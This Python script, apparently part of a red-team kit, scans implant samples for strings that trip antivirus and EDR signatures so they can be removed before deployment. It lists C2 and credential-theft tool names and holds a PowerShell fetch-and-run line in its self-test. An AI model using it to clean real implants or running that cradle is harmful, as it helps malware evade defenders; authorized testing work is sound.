#!/usr/bin/env python3
"""大爱仙尊特征清理扫描：落地前先看自己的样本会被什么签名打死。

只读本地文件，不联网、不生成 implant。授权机落地仍走 host_c2_verify。
扫：C2 产品串、凭据工具串、PDB/路径泄漏、默认文件名、壳节区、脚本 IOC。

示例:
  python3 炼蛊房/sig_cleanup_scan.py --path ./implant.bin --case <案>
  python3 炼蛊房/sig_cleanup_scan.py --path ./beacon.ps1 --json
  python3 炼蛊房/sig_cleanup_scan.py --self-test
"""
from __future__ import annotations

import argparse
import json
import math
import re
import sys
from pathlib import Path
from typing import Any

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

HEAD = 4 * 1024 * 1024

# (family, severity, needle)  — needle 小写匹配
STRING_IOC: tuple[tuple[str, str, str], ...] = (
    ("c2_product", "high", "sliverpb"),
    ("c2_product", "high", "bishopfox"),
    ("c2_product", "high", "sliver"),
    ("c2_product", "high", "cobalt strike"),
    ("c2_product", "high", "beacon.dll"),
    ("c2_product", "high", "malleable"),
    ("c2_product", "high", "meterpreter"),
    ("c2_product", "high", "metasploit"),
    ("c2_product", "high", "havoc"),
    ("c2_product", "high", "mythic"),
    ("c2_product", "high", "bruteratel"),
    ("c2_product", "high", "badger"),
    ("c2_product", "med", "implant"),
    ("cred_tool", "high", "mimikatz"),
    ("cred_tool", "high", "sekurlsa"),
    ("cred_tool", "high", "gentilkiwi"),
    ("cred_tool", "high", "lazagne"),
    ("cred_tool", "med", "invoke-mimikatz"),
    ("script_ioc", "high", "iex (new-object net.webclient)"),
    ("script_ioc", "high", "downloadstring"),
    ("script_ioc", "med", "amsiutils"),
    ("script_ioc", "med", "amsi.dll"),
    ("script_ioc", "med", "etw"),
    ("compiler_leak", "med", ".pdb"),
    ("compiler_leak", "med", "c:\\users\\"),
    ("compiler_leak", "low", "/home/"),
    ("sandbox_string", "low", "vmware"),
    ("sandbox_string", "low", "virtualbox"),
    ("sandbox_string", "low", "vbox"),
    ("sandbox_string", "low", "wireshark"),
)

PACKER_SECTIONS = (b"UPX0", b"UPX1", b".packed", b".themida", b".vmp")
DEFAULT_NAMES = (
    "sliver.bin",
    "sliver.exe",
    "beacon.exe",
    "beacon.bin",
    "payload.exe",
    "payload.bin",
    "implant.exe",
    "meterpreter.exe",
    "shell.exe",
    "rev.exe",
)


def _entropy(data: bytes) -> float:
    if not data:
        return 0.0
    freq = [0] * 256
    for b in data:
        freq[b] += 1
    n = len(data)
    ent = 0.0
    for c in freq:
        if c:
            p = c / n
            ent -= p * math.log2(p)
    return round(ent, 3)


def _ascii_blob(data: bytes, min_len: int = 5) -> str:
    out: list[str] = []
    buf: list[int] = []
    for b in data:
        if 32 <= b < 127:
            buf.append(b)
            continue
        if len(buf) >= min_len:
            out.append(bytes(buf).decode("ascii", errors="ignore"))
        buf = []
    if len(buf) >= min_len:
        out.append(bytes(buf).decode("ascii", errors="ignore"))
    return "\n".join(out).lower()


def _pe_hints(data: bytes) -> dict[str, Any]:
    hints: dict[str, Any] = {"is_pe": False, "is_elf": False, "sections": []}
    if data[:2] == b"MZ" and len(data) > 0x40:
        e_lfanew = int.from_bytes(data[0x3C:0x40], "little")
        if 0 < e_lfanew < len(data) - 4 and data[e_lfanew : e_lfanew + 4] == b"PE\x00\x00":
            hints["is_pe"] = True
            # 粗扫节名（PE 可选头之后 40 字节一段，这里只做字符串碰）
            for name in PACKER_SECTIONS:
                if name in data[:4096]:
                    hints["sections"].append(name.decode("latin1", errors="ignore"))
    if data[:4] == b"\x7fELF":
        hints["is_elf"] = True
    return hints


def scan_bytes(data: bytes, *, name: str = "sample") -> dict[str, Any]:
    text = _ascii_blob(data)
    name_l = name.lower()
    hits: list[dict[str, str]] = []
    for family, sev, needle in STRING_IOC:
        if needle in text or needle in name_l:
            hits.append({"family": family, "severity": sev, "needle": needle})

    hints = _pe_hints(data)
    if hints["sections"]:
        hits.append(
            {
                "family": "packer",
                "severity": "med",
                "needle": ",".join(hints["sections"]),
            }
        )
    if name_l in DEFAULT_NAMES or any(name_l.endswith(n) for n in DEFAULT_NAMES):
        hits.append({"family": "default_name", "severity": "high", "needle": name_l})

    # 宽字符常见产品串（UTF-16LE sliver）
    if b"s\x00l\x00i\x00v\x00e\x00r\x00" in data[:HEAD]:
        hits.append({"family": "c2_product", "severity": "high", "needle": "sliver_utf16"})

    high = sum(1 for h in hits if h["severity"] == "high")
    med = sum(1 for h in hits if h["severity"] == "med")
    score = high * 30 + med * 10 + max(0, len(hits) - high - med) * 3
    if score > 100:
        score = 100

    verdict = "dirty" if high else ("review" if med or hits else "clean")
    rec = {
        "name": name,
        "size": len(data),
        "entropy": _entropy(data[:65536]),
        "pe": hints["is_pe"],
        "elf": hints["is_elf"],
        "hits": hits,
        "high": high,
        "med": med,
        "score": score,
        "verdict": verdict,
        "next": (
            [
                "清掉产品串 / PDB / 默认文件名后再扫一遍",
                "python3 炼蛊房/host_c2_verify.py init --case <案> --host <授权主机> --edr <产品>",
            ]
            if verdict != "clean"
            else [
                "静态特征面可过；授权机仍要 host_c2_verify 记 av_action/callback",
            ]
        ),
        "playbook": "传承/隐鳞.md",
    }
    return rec


def scan_path(path: Path) -> dict[str, Any]:
    data = path.read_bytes()[:HEAD]
    rec = scan_bytes(data, name=path.name)
    rec["path"] = str(path)
    return rec


SELF_CASES: list[tuple[str, bytes, str]] = [
    ("clean.txt", b"hello daaixianzun sample\n", "clean"),
    ("sliver.bin", b"MZ" + b"\x00" * 20 + b"this is sliverpb beacon\n", "dirty"),
    ("tool.exe", b"mimikatz sekurlsa\n", "dirty"),
    ("drop.ps1", b"IEX (New-Object Net.WebClient).DownloadString('http://x')\n", "dirty"),
    ("build.exe", b"C:\\Users\\dev\\src\\agent.pdb\nUPX0", "review"),
]


def run_self_test() -> list[str]:
    fails: list[str] = []
    for name, blob, expect in SELF_CASES:
        rec = scan_bytes(blob, name=name)
        if rec["verdict"] != expect:
            fails.append(f"{name}: verdict={rec['verdict']} expect={expect} hits={rec['hits']}")
    return fails


def main() -> int:
    ap = argparse.ArgumentParser(description="大爱仙尊特征清理扫描（落地前只读）")
    ap.add_argument("--path", default="", help="本地样本")
    ap.add_argument("--case", default="", help="写入 案卷/sig_cleanup/")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--self-test", action="store_true")
    args = ap.parse_args()

    if args.self_test:
        fails = run_self_test()
        if fails:
            for f in fails:
                print(f"FAIL {f}")
            return 1
        print(f"self-test ok  {len(SELF_CASES)} cases")
        return 0

    if not args.path:
        ap.error("需要 --path 或 --self-test")
    target = Path(args.path).expanduser()
    if not target.is_file():
        print(f"[err] 文件不存在: {target}", file=sys.stderr)
        return 2

    rec = scan_path(target)
    if args.case:
        from scope_lib import write_probe_json

        out = write_probe_json(
            rec,
            case=args.case,
            case_subdir="sig_cleanup",
            filename="sig_scan.json",
        )
        rec["out"] = str(out)

    if args.json or args.case:
        print(json.dumps(rec, ensure_ascii=False, indent=2))
    else:
        print(f"VERDICT {rec['verdict']}  score={rec['score']}  high={rec['high']} med={rec['med']}")
        print(f"FILE    {rec.get('path') or rec['name']}  size={rec['size']} entropy={rec['entropy']}")
        print(f"KIND    pe={rec['pe']} elf={rec['elf']}")
        if rec["hits"]:
            print("HITS")
            for h in rec["hits"]:
                print(f"  [{h['severity']}] {h['family']}  {h['needle']}")
        print("NEXT")
        for c in rec["next"]:
            print(f"  {c}")
        print(f"PLAYBOOK {rec['playbook']}")
    return 0 if rec["verdict"] != "dirty" else 3


if __name__ == "__main__":
    raise SystemExit(main())
